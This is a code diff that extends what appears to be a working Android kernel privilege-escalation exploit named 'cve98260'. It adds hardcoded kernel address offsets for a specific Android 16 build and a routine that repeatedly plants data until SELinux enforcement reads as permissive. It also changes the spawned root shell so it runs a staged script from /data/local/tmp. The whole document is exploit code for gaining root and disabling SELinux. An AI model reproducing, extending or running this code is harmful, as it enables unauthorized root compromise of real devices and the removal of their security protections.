@@ -1,0 +1,102 @@
+--- a/src/kernel_profile.h
++++ b/src/kernel_profile.h
+@@ -62,6 +62,20 @@ static const struct cve98260_profile cve98260_profiles[] = {
+         0xffffffc082573878ULL,
+         0xffffffc082573d48ULL,
+     },
++    {
++        "6.12.69-android16-6-g242e1a07f878-ab15865446-4k",
++        "Android 16 6.12.69 ab15865446 (boot-image/QEMU validated)",
++        0,
++        0, 0, 0, 0,
++        0xffffffc0803718f4ULL, 0x1718f4ULL,
++        0xffffffc0800e94a4ULL, 0x0e94a4ULL,
++        0x0fc50cULL,
++        0xffffffc082888890ULL,
++        0xffffffc082602170ULL,
++        0xffffffc082601ef8ULL,
++        0xffffffc082603638ULL,
++        0xffffffc082603b08ULL,
++    },
+ };
+ 
+ static const struct cve98260_profile *cve98260_active_profile;
+--- a/app/native/cve98260.c
++++ b/app/native/cve98260.c
+@@ -1374,7 +1374,8 @@ static char **cve_child_env(void)
+     static char *ep[12];
+     static char buf[10][512];
+     static const char *names[] = {
+-        "CVE_SO", "CVE_ROOT_SCRIPT", "CVE_KSU_MODE", "CVE_KSU_KO",
++        "CVE_SO", "CVE_ROOT_SCRIPT", "CVE_DISABLE_SELINUX",
++        "CVE_KSU_MODE", "CVE_KSU_KO",
+         "CVE_KSU_PATCHED", "CVE_KSU_SYMS", "CVE_KREL", "CVE_KSUD"
+     };
+     int n = 0, b = 0;
+@@ -1944,6 +1945,35 @@ static int cve98260_worker_main(int argc, char **argv)
+         }
+     }
+ 
++    if (getenv("CVE_DISABLE_SELINUX") &&
++        !strcmp(getenv("CVE_DISABLE_SELINUX"), "1")) {
++        struct plant_res sr;
++        int a;
++
++        memset(&sr, 0, sizeof(sr));
++        for (a = 0; a < 6; a++) {
++            int enforce;
++
++            logf("[+] broker selinux plant attempt %d/6\n", a + 1);
++            run_plant(0, PLANT_SELINUX, 1, &sr, raw, evs);
++            if (!sr.ok)
++                continue;
++            enforce = read_int_file("/sys/fs/selinux/enforce");
++            if (enforce == 0) {
++                logf("[+] selinux permissive for restricted broker\n");
++                break;
++            }
++            logf("[!] selinux verify miss enforce=%d plant=%d\n",
++                   enforce, a + 1);
++        }
++        if (a == 6) {
++            if (g_held)
++                park_forever("no verified broker selinux plant");
++            confirm_victim_reaped();
++            return 1;
++        }
++    }
++
+     struct plant_res r;
+     memset(&r, 0, sizeof(r));
+     for (int a = 0; a < 3 && !r.ok; a++) {
+--- a/app/native/cve98260.c
++++ b/app/native/cve98260.c
+@@ -608,6 +608,7 @@ static void park_forever(const char *why)
+      * any later output would be lost (and was the original SIGPIPE death).
+      */
++    cve_lifecycle_mark_parked();
+     log_worker_stat();
+     if (!g_status_sent) {
+         logf("KSU_CHAIN_HELD\n");
+
+--- a/app/native/cve98260.c
++++ b/app/native/cve98260.c
+@@ -1607,10 +1607,14 @@ static int wait_child_main(int shell_mode)
+             execve("/system/bin/sh", av, (char *const *)cve_child_env());
+         } else {
+             char *const av[] = { (char *)"sh", (char *)"-c",
+-                (char *)"id; cat /proc/self/attr/current; "
+-                        "if [ -n \"$CVE_ROOT_SCRIPT\" ] && [ -f \"$CVE_ROOT_SCRIPT\" ]; "
+-                        "then sh \"$CVE_ROOT_SCRIPT\"; echo ROOT_SCRIPT_RC=$?; fi; "
+-                        "echo ROOT_SHELL_OK", NULL };
++                (char *)"id; cat /proc/self/attr/current; "
++                        "S=${CVE_ROOT_SCRIPT:-/data/local/tmp/x9u-cve98260/x9u-cve-root-stage.sh}; "
++                        "echo ROOT_SCRIPT_PATH=$S; "
++                        "if [ -f \"$S\" ]; then "
++                        "sh \"$S\"; R=$?; echo ROOT_SCRIPT_RC=$R; "
++                        "[ $R -eq 0 ] || exit $R; "
++                        "else echo ROOT_SCRIPT_MISSING; exit 126; fi; "
++                        "echo ROOT_SHELL_OK", NULL };
+ 
+            execve("/system/bin/sh", av, (char *const *)cve_child_env());
+        }
